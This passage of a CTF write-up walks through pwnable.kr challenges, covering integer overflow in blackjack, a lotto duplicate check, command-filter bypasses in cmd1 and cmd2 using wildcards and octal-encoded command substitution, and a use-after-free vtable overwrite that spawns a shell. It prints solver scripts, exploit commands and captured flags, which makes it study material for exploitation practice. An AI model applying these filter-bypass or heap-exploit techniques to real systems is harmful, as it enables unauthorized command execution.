		#print 'value-->',value
		if value!=((right-left+1)*10):
			#print right,left,'here'
			r = mid
			mid = (r + l)/2
			right = mid
		else:
			l = mid + 1
			left = l
			mid = (r + l)/2
			right = mid
		if l>=r:
			answer = str(l)
			break
	#print '----<',i
	while i<trials-1:
		io.writeline(answer)
		i+=1
	#print 'find',l,r,answer
	io.writeline(answer)


print 'okokokflag-->'
flag = io.read_until('\n')
print flag
io.interact()
```
normal version:
```
from socket import *
import random
import time

HOST = '0'
PORT = 9007
BUFSIZ = 99999
ADDR = (HOST, PORT)

tcpClientSock = socket(AF_INET, SOCK_STREAM)
tcpClientSock.connect(ADDR)

rec = tcpClientSock.recv(BUFSIZ)
time.sleep(4)

for m in xrange(100):

	time.sleep(0.2)
	rec = tcpClientSock.recv(BUFSIZ)
	idx = rec.find("N=")

	if idx != -1:
		tmp = rec[idx:].split(" ")
		totalnum = int(tmp[0][2:])
		trials = int(tmp[1][2:])
		print 'find-->',totalnum,trials
	else:
		print "not find"
	l = 0
	r = totalnum - 1
	mid = totalnum/2
	left = l
	right = mid
	answer = ""
	for i in xrange(trials):
		ss = [str(n) for n in range(left,right+1)]
		sends = " ".join(ss)
		tcpClientSock.send(sends+"\n")
		rec = tcpClientSock.recv(BUFSIZ)
		value = int(rec)
		#print 'value-->',value
		if value!=((right-left+1)*10):
			#print right,left,'here'
			r = mid
			mid = (r + l)/2
			right = mid
		else:
			l = mid + 1
			left = l
			mid = (r + l)/2
			right = mid
		if l>=r:
			answer = str(l)
			break
	while i<trials-1:
		tcpClientSock.send(answer+"\n")
		i+=1
	#print 'find',l,r,answer
	tcpClientSock.send(answer+"\n")
	rec = tcpClientSock.recv(BUFSIZ)
	print '---->',rec


time.sleep(0.2)
rec = tcpClientSock.recv(BUFSIZ)
print "over!flag=",rec

tcpClientSock.close()
```


## 0x0C blackjack
```
Hey! check out this C implementation of blackjack game!
I found it online
* http://cboard.cprogramming.com/c-programming/114023-simple-blackjack-program.html

I like to give my flags to millionares.
how much money you got?


Running at : nc pwnable.kr 9009
```
It is a integer overflow. Based on the hint of "I like to give my flag to millionaires", I tried entering `10000000000` as my bet. Try to win once and I become millionaire.
```
YaY_I_AM_A_MILLIONARE_LOL


Cash: $1410065908
-------
|S    |
|  2  |
|    S|
-------
```


## 0x0D lotto
```
Mommy! I made a lotto program for my homework.
do you want to play?


ssh lotto@pwnable.kr -p2222 (pw:guest)
```
Some code of `lotto.c`
```
int match = 0, j = 0;
    for(i=0; i<6; i++){
        for(j=0; j<6; j++){
            if(lotto[i] == submit[j]){
                match++;
            }
        }
    }
```
This code means if what you entered is in lotto, for example lotto is !"#$%&, and you enter ######, it's ok. So just try ###### until we get flag.
```
- Select Menu -
1. Play Lotto
2. Help
3. Exit
1
Submit your 6 lotto bytes : !!!!!!
Lotto Start!
sorry mom... I FORGOT to check duplicate numbers... :(
```


## 0x0E cmd1
```
Mommy! what is PATH environment in Linux?

ssh cmd1@pwnable.kr -p2222 (pw:guest)
```
The source code `cmd1.c`
```
#include <stdio.h>
#include <string.h>

int filter(char* cmd){
	int r=0;
	r += strstr(cmd, "flag")!=0;
	r += strstr(cmd, "sh")!=0;
	r += strstr(cmd, "tmp")!=0;
	return r;
}
int main(int argc, char* argv[], char** envp){
	putenv("PATH=/fuckyouverymuch");
	if(filter(argv[1])) return 0;
	system( argv[1] );
	return 0;
}
```
What we enter should not include `flag`, `sh`, `tmp`, and the `PATH` is of no use.
But if we pass the validate, what we entered will be executed. So, we can replace `flag` by `fla*`, and use full path which there's no need to use `PATH` in environment variable.
```
cmd1@ubuntu:~$ ./cmd1 "/bin/cat fla*"
mommy now I get what PATH environment is for :)
```


## 0x0F cmd2
```
Daddy bought me a system command shell.
but he put some filters to prevent me from playing with it without his permission...
but I wanna play anytime I want!

ssh cmd2@pwnable.kr -p2222 (pw:flag of cmd1)
```
The source code `cmd2.c`
```
#include <stdio.h>
#include <string.h>

int filter(char* cmd){
	int r=0;
	r += strstr(cmd, "/")!=0;
	r += strstr(cmd, "`")!=0;
	r += strstr(cmd, "flag")!=0;
	return r;
}

extern char** environ;
void delete_env(){
	char** p;
	for(p=environ; *p; p++)	memset(*p, 0, strlen(*p));
}

int main(int argc, char* argv[], char** envp){
	delete_env();
	putenv("PATH=/no_command_execution_until_you_become_a_hacker");
	if(filter(argv[1])) return 0;
	printf("%s\n", argv[1]);
	system( argv[1] );
	return 0;
}
```
This problem is harder then the last one. We can make it by echo encoding.
```
In [1]: from pwn import *

In [2]: cmd = "/bin/cat flag"

In [3]: print "\\"+"\\".join([oct(i) for i in ordlist(cmd)])
\057\0142\0151\0156\057\0143\0141\0164\040\0146\0154\0141\0147


cmd2@ubuntu:~$ ./cmd2 '$(echo "\057\0142\0151\0156\057\0143\0141\0164\040\0146\0154\0141\0147")'
$(echo "\057\0142\0151\0156\057\0143\0141\0164\040\0146\0154\0141\0147")
FuN_w1th_5h3ll_v4riabl3s_haha
```


## 0x10 uaf
```
Mommy, what is Use After Free bug?

ssh uaf@pwnable.kr -p2222 (pw:guest)
```
The source code `uaf.cpp`
```
#include <fcntl.h>
#include <iostream>
#include <cstring>
#include <cstdlib>
#include <unistd.h>
using namespace std;

class Human{
private:
        virtual void give_shell(){
                system("/bin/sh");
        }
protected:
        int age;
        string name;
public:
        virtual void introduce(){
                cout << "My name is " << name << endl;
                cout << "I am " << age << " years old" << endl;
        }
};

class Man: public Human{
public:
        Man(string name, int age){
                this->name = name;
                this->age = age;
        }
        virtual void introduce(){
                Human::introduce();
                cout << "I am a nice guy!" << endl;
        }
};

class Woman: public Human{
public:
        Woman(string name, int age){
                this->name = name;
                this->age = age;
        }
        virtual void introduce(){
                Human::introduce();
                cout << "I am a cute girl!" << endl;
        }
};

int main(int argc, char* argv[]){
        Human* m = new Man("Jack", 25);
        Human* w = new Woman("Jill", 21);

        size_t len;
        char* data;
        unsigned int op;
        while(1){
                cout << "1. use\n2. after\n3. free\n";
                cin >> op;

                switch(op){
                        case 1:
                                m->introduce();
                                w->introduce();
                                break;
                        case 2:
                                len = atoi(argv[1]);
                                data = new char[len];
                                read(open(argv[2], O_RDONLY), data, len);
                                cout << "your data is allocated" << endl;
                                break;
                        case 3:
                                delete m;
                                delete w;
                                break;
                        default:
                        break;
                }
        }

        return 0;
```
We can see that if we free and then use, it will cause segmentation fault, because we want to refer a object not exists. So if we use after, it will copy chars whose length is `argv[1]` from the file `argv[2]`.

How does malloc do its job(Form Here)?

    For large (>= 512 bytes) requests, it is a pure best-fit allocator, with ties normally decided via FIFO (i.e. least recently used).
    For small (<= 64 bytes by default) requests, it is a caching allocator, that maintains pools of quickly recycled chunks.
    In between, and for combinations of large and small requests, it does the best it can trying to meet both goals at once.
    For very large requests (>= 128KB by default), it relies on system memory mapping facilities, if supported.

In this code, we only need 24bit to save `*vtable,age`,`*name`.

First we break at 0x400f18 and run:
```
RAX: 0x603040 --> 0x401570 --> 0x40117a (<_ZN5Human10give_shellEv>: push   rbp)
RBX: 0x603040 --> 0x401570 --> 0x40117a (<_ZN5Human10give_shellEv>: push   rbp)
RCX: 0x7ffff7dd93c0 --> 0x0
RDX: 0x19
RSI: 0x7fffffffea20 --> 0x603028 --> 0x6b63614a ('Jack')
RDI: 0x7ffff7dd93c0 --> 0x0
RBP: 0x7fffffffea70 --> 0x0
RSP: 0x7fffffffea10 --> 0x7fffffffeb58 --> 0x7fffffffed86 ("/home/c/ctf/uaf")
RIP: 0x400f18 (<main+84>:   mov    QWORD PTR [rbp-0x38],rbx)
R8 : 0x0
R9 : 0x2
R10: 0x7fffffffe790 --> 0x0
R11: 0x7ffff7b91470 (<_ZNSs6assignERKSs>:   push   rbp)
R12: 0x7fffffffea20 --> 0x603028 --> 0x6b63614a ('Jack')
R13: 0x7fffffffeb50 --> 0x1
R14: 0x0
R15: 0x0
```
The vtable of Man is at 0x401570.x/3x 0x401570:
```
0x401570 <_ZTV3Man+16>: 0x000000000040117a  0x00000000004012d2
0x401580 <_ZTV5Human>:  0x0000000000000000
```
The `0x000000000040117a` is give_shell, and the `0x00000000004012d2` is introduce of Man.

So we will apply for space and write something to let the introduce be give_shell. When we call introduce, it will call `*vtable + x`. If `addr + 4 == *vtable + 0`(give_shell), the addr must equals `*vtable - 4` which is `0x401568`.

And the code will be:
```
python -c 'print ("\x68\x15\x40\x00\x00\x00\x00\x00")' > /tmp/ihcuaf
./uaf 8 /tmp/ihcuaf
3 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 1
cat flag
```
UPDATE:

Using 8 is not a correct way. It success only beacuse 24 is less than 32, apply for 8 will be given 32 too.

If some more attributes be added to class, it will not give you the freed block if you apply for 8.
```
python -c 'print ("\x68\x15\x40\x00\x00\x00\x00\x00")' > /tmp/ihcuaf
./uaf 24 /tmp/ihcuaf
3 2 2 1
cat flag
```


## 0x11 codemap
```
I have a binary that has a lot information inside heap.
How fast can you reverse-engineer this?
(hint: http://codemap.kr)
(hint2: see the information inside EAX,EBX when 0x403E65 is executed)

ps. sorry if you don't have IDA Pro.
download: http://pwnable.kr/bin/codemap.exe


ssh codemap@pwnable.kr -p2222 (pw:guest)
```


## 0x12 memcpy
```
Are you tired of hacking?, take some rest here.
Just help me out with my small experiment regarding memcpy performance.
after that, flag is yours.

http://pwnable.kr/bin/memcpy.c

ssh memcpy@pwnable.kr -p2222 (pw:guest)
```
